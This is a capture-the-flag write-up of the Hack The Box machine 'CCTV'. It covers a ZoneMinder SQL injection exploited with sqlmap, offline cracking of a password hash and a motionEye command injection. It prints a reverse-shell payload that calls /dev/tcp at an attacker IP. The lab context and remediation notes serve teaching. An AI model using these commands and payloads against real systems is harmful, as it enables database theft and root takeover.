## Summary

CCTV is an Easy Linux machine running a **ZoneMinder** CCTV platform. A SQL
injection in ZoneMinder (CVE-2024-51482) exposes the user password hashes; the
recovered credentials for `mark` are reused for SSH access. From there, a
locally bound **motionEye** service is reached through an SSH tunnel and abused
via a command injection in the *Image File Name* field (CVE-2025-60787),
yielding a reverse shell as **root**.

## Machine Information

| Name | Difficulty | OS | Platform |
| --- | --- | --- | --- |
| CCTV | Easy | Linux | Hack The Box |

## Attack Path

1. Nmap reveals SSH and HTTP, with the web app redirecting to `cctv.htb`.
2. The web application is identified as ZoneMinder.
3. A SQL injection in ZoneMinder is exploited to dump the `Users` table.
4. The hash for `mark` is cracked offline, recovering the password.
5. The password is reused to obtain SSH access as `mark`.
6. The local-only motionEye service is reached via an SSH tunnel.
7. A command injection in motionEye returns a reverse shell as root.

## Reconnaissance

Initial enumeration was performed with Nmap to identify open ports, services
and versions.

```bash
nmap -sC -sV -A 10.129.23.191
```

| Port | Service | Notes |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 9.6p1 on Ubuntu 24.04 |
| 80/tcp | HTTP | Apache 2.4.58, redirects to `http://cctv.htb/` |

The main entry point was the web service. After adding `cctv.htb` to
`/etc/hosts`, enumeration focused on the HTTP application.

## Web Enumeration

Content discovery was used to map the application and identify the software
running on the target.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://cctv.htb/FUZZ -mc 200
```

The interface and discovered endpoints identified the application as
**ZoneMinder**, a CCTV monitoring platform. Enumeration then focused on its
components and known vulnerabilities.

## Exploitation — SQL Injection (ZoneMinder)

Analysis surfaced **CVE-2024-51482**: the endpoint below was vulnerable to SQL
injection.

```
http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1
```

Exploitation was automated with `sqlmap`, reusing the authenticated session
cookie.

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --dump -T Users -C Username,Password \
  --batch \
  --dbms=MySQL \
  --technique=T \
  --cookie="ZMSESSID=1hh7m1gb370gmerocuk05hppvn"
```

This confirmed access to the `zm` database and dumped the `Users` table. The
recovered accounts were `superadmin`, `mark` and `admin`. The next step was to
crack the hashes offline.

## Credential Cracking

The hash for `mark` was saved to a file and cracked with `john` using the
`rockyou.txt` wordlist.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

The recovered password was:

```
mark : opensesame
```

## Initial Access (User)

The credentials recovered from the database were reused to authenticate over
SSH as `mark`.

```bash
ssh mark@cctv.htb
```

This provided the initial foothold on the system. The user flag lives at
`/home/sa_mark/user.txt`.

## Privilege Escalation

### Enumeration

With a shell as `mark`, local enumeration revealed two relevant facts:

1. The host ran both **ZoneMinder** and **motionEye**.
2. The **motionEye** service was bound to localhost only on `127.0.0.1:8765`.

```bash
ss -tlnp
systemctl list-units --type=service --state=running
```

Reading the motionEye configuration confirmed the service was in use and worth
inspecting through its admin interface.

```bash
cat /etc/motioneye/motion.conf
```

Since the application was bound to localhost, an SSH tunnel was used to reach it
from the attacker machine.

```bash
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

With the tunnel active, the motionEye panel was reachable at
`http://127.0.0.1:8765`.

### motionEye RCE (CVE-2025-60787)

The **Image File Name** field was vulnerable to command injection. It accepted a
malicious string that was executed by the service, allowing a reverse shell
payload.

```bash
$(/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.233/4444 0>&1')
```

A listener was prepared on the attacker machine:

```bash
nc -lvnp 4444
```

After saving the configuration, motionEye executed the command and a reverse
connection was received as **root**.

```
uid=0(root) gid=0(root) groups=0(root)
```

The injection ran as root because the process handling the affected feature was
running with elevated privileges, turning the command injection into RCE as
root. The root flag lives at `/root/root.txt`.

## Vulnerability Analysis

**SQL Injection in ZoneMinder (CVE-2024-51482)** — the
`request=event&action=removetag` endpoint accepted attacker-controlled input,
allowing extraction of the MySQL database including user password hashes and
leading to account compromise through password reuse. Fix: upgrade ZoneMinder,
use parameterized queries, and apply least-privilege to the database account.

**Credential reuse** — the password recovered for `mark` in the database was
also valid for SSH, turning a web compromise into operating system access. Fix:
enforce unique credentials per service and rotate exposed passwords.

**Command Injection / RCE in motionEye (CVE-2025-60787)** — the image file name
field was processed insecurely by a service running with elevated privileges,
turning a config field into root RCE. Fix: upgrade motionEye, validate/escape
configuration input, and run the service as an unprivileged user.

## Tools Used

- Nmap
- ffuf
- sqlmap
- John the Ripper
- SSH
- Netcat

## Key Takeaways

- A seemingly simple SQL injection can compromise an entire machine when credentials are reused.
- Services bound to `localhost` are still reachable after a foothold, especially through SSH tunneling.
- Internal admin interfaces exposed only locally are not inherently safe, particularly when they contain command injection.
- Enumerating local services after the foothold is essential for finding privesc paths outside the usual sudo, SUID or cron vectors.
